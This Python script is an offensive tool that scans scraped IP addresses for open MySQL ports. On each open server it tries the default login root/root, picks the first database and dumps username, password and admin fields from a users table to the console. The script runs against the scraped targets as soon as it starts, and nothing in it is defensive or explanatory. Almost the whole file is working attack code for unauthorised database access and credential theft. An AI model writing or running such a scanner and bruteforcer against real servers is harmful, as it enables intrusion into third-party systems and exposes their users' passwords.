import asyncio, socket, threading, mysql.connector, time
from colorama import *
from scraper import Scraper

class Bruter(Scraper):
    def __init__(self):
        self.username = "root"
        self.password = "root"
        self.mySQLactive = []
        Scraper.__init__(self)
        

    async def check(self):
        vulnList = await self.get_urls()
        for ip in vulnList:
            newThread = threading.Thread(target=self.isVuln, args=(ip,))
            newThread.start()
        time.sleep(3)
        for ip in self.mySQLactive:
            newThread = threading.Thread(target=self.brute, args=(ip,))
            newThread.start()
            time.sleep(0.55)
      
    def isVuln(self, ip):
        try:
            s = socket.socket() 
            s.settimeout(3) # If it doesnt connect in 4 seconds then mysql is not open :(
            s.connect((ip, 3306))
            print(Fore.GREEN+f"{ip} Has A Active MySQL Database", Fore.RESET)
            self.mySQLactive.append(str(ip))
        except:
            print(Fore.RED+f"{ip} Does Not Have MySQL Installed", Fore.RESET)
            pass


    def brute(self, ip):
        try:
            print(Fore.YELLOW+f"[!] Trying To Bruteforce {Fore.WHITE}{ip} {Fore.YELLOW}[!]", Fore.RESET)
            connect = mysql.connector.connect(
                host=ip,
                user=self.username,
                password=self.password # pip install mysql-connector-python
            )
            print(Fore.GREEN+f"[-] Successfully Connected To: {Fore.WHITE}{ip} {Fore.GREEN}[-]", Fore.RESET)
            interactDB = connect.cursor()
            interactDB.execute("SHOW DATABASES;")
            dbs = interactDB.fetchall()
            DB = "".join(dbs[0])
            print(Fore.GREEN+f"Found Database: {Fore.WHITE}{DB}", Fore.RESET)
            interactDB.execute(f"USE {DB}")
            print(Fore.YELLOW+"[*] Dumping Database [*]", Fore.RESET)
            interactDB.execute("SELECT username,password,admin FROM users;")
            ACCOUNTS = interactDB.fetchall()
            for x in ACCOUNTS:
                user = x[0]
                passwd = x[1]
                admin = x[2]
                if admin == 1:
                    print(Fore.GREEN+f"Found Login {Fore.BLUE}| {Fore.WHITE}Username: {Fore.GREEN}{user} {Fore.BLUE}| {Fore.WHITE}Password: {Fore.GREEN}{passwd}{Fore.BLUE}| {Fore.WHITE}Admin: {Fore.GREEN}True", Fore.RESET)
                else:
                    print(Fore.GREEN+f"Found Login {Fore.BLUE}| {Fore.WHITE}Username: {Fore.GREEN}{user} {Fore.BLUE}| {Fore.WHITE}Password: {Fore.GREEN}{passwd}{Fore.BLUE}| {Fore.WHITE}Admin: {Fore.RED}False", Fore.RESET)
        except:
            print(Fore.RED+f"[X] {Fore.WHITE}Failed To Login To: {Fore.BLUE}{ip} {Fore.RED}[X]", Fore.RESET)
        
            

_instance = Bruter()
#asyncio.run(_instance.check())
asyncio.run(_instance.check())